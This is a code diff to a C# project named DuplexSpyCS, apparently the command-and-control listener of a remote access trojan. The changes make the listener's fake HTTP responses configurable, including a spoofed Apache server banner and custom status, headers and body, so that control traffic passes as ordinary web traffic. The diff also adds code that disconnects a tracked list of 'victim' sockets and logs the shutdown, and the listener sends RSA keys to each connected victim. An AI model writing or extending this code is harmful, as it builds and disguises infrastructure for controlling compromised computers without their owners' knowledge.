@@ -26,18 +26,19 @@ namespace DuplexSpyCS
             m_protocol = enListenerProtocol.HTTP;
 
             m_listener = new TcpListener(IPAddress.Any, nPort);
-            m_cts = new CancellationTokenSource();
 
             m_bIslistening = false;
         }
 
         public class clsHttpResp
         {
+            private stListenerConfig m_config { get; set; }
             private string m_szStateCode = "200 OK";
             private string m_szBody { get; init; }
 
-            public clsHttpResp()
+            public clsHttpResp(stListenerConfig config)
             {
+                m_config = config;
                 m_szBody = string.Empty;
             }
 
@@ -53,22 +54,34 @@ namespace DuplexSpyCS
                 m_szBody = Convert.ToBase64String(dsp.GetBytes());
             }
 
-            public clsHttpResp(string szStateCode, string szMsg)
-            {
-                m_szStateCode = szStateCode;
-                m_szBody = szMsg;
-            }
-
             public byte[] fnGetBytes() => fnGetBytes(m_szBody);
             public byte[] fnGetBytes(byte[] abBuffer) => fnGetBytes(Convert.ToBase64String(abBuffer));
             public byte[] fnGetBytes(string szMsg)
             {
-                string szResp = $"" +
-                    $"HTTP/1.1 {m_szStateCode}\r\n" +
-                    $"Server: Apache/1.3.27\r\n" +
-                    $"Content-Type: text/html\r\n" +
-                    $"content-length: {m_szBody.Length}\r\n\r\n" +
-                    $"{m_szBody}";
+                string szResp = string.Empty;
+                if (string.IsNullOrEmpty(m_config.szName))
+                {
+                    szResp = $"" +
+                        $"HTTP/1.1 {m_szStateCode}\r\n" +
+                        $"Server: Apache/1.3.27\r\n" +
+                        $"Content-Type: text/html\r\n" +
+                        $"content-length: {m_szBody.Length}\r\n" +
+                        $"Connection: Closed\r\n\r\n" +
+                        $"{m_szBody}";
+                }
+                else
+                {
+                    DateTime date = DateTime.UtcNow;
+
+                    szResp = $"" +
+                        $"HTTP/1.1 {m_config.szStatus}\r\n" +
+                        $"Server: {m_config.szServer}\r\n" +
+                        $"Date: {date.ToString("ddd, dd MMM yyyy HH:mm:ss 'GMT'", System.Globalization.CultureInfo.InvariantCulture)}\r\n" +
+                        $"Content-Type: {m_config.szContentType}\r\n" +
+                        $"content-length: {m_config.szBody.Length}\r\n" +
+                        $"Connection: Closed\r\n\r\n" +
+                        $"{m_config.szBody}";
+                }
 
                 return Encoding.UTF8.GetBytes(szResp);
             }
@@ -90,7 +103,7 @@ namespace DuplexSpyCS
                 var hSafe = sktSrv.SafeHandle;
                 if (sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                     m_listener = new TcpListener(IPAddress.Any, m_nPort);
-
+                m_cts = new CancellationTokenSource();
                 m_listener.Start();
                 _ = Task.Run(() => fnAcceptLoop(m_cts.Token));
                 m_bIslistening = true;
@@ -109,6 +122,21 @@ namespace DuplexSpyCS
 
             try
             {
+                foreach (var victim in m_lsVictim)
+                {
+                    try
+                    {
+                        if (victim.socket != null && victim.socket.Connected)
+                            victim.socket.Close();
+                    }
+                    catch (Exception ex)
+                    {
+                        clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
+                    }
+                }
+
+                m_lsVictim.Clear();
+
                 m_cts.Cancel();
                 m_listener.Stop();
                 m_bIslistening = false;
@@ -117,6 +145,8 @@ namespace DuplexSpyCS
             {
                 MessageBox.Show(ex.Message, "fnStop()", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
+
+            clsStore.sql_conn.WriteSystemLogs($"Stop listening port: {m_nPort}");
         }
 
         private async Task fnAcceptLoop(CancellationToken ct)
@@ -152,7 +182,8 @@ namespace DuplexSpyCS
                 victim.key_pairs = (szRsaPublicKey, szRsaPrivateKey);
 
                 //Fake response.
-                victim.Send(new clsHttpResp("500 Error", "HTTP 500://Server internal error.").fnGetBytes());
+                var config = clsStore.sql_conn.fnGetListener(m_szName);
+                victim.Send(new clsHttpResp(config).fnGetBytes());
 
                 //Send RSA public key.
                 victim.Send(new clsHttpResp(1, 0, clsCrypto.b64E2Str(szRsaPublicKey)).fnGetBytes());
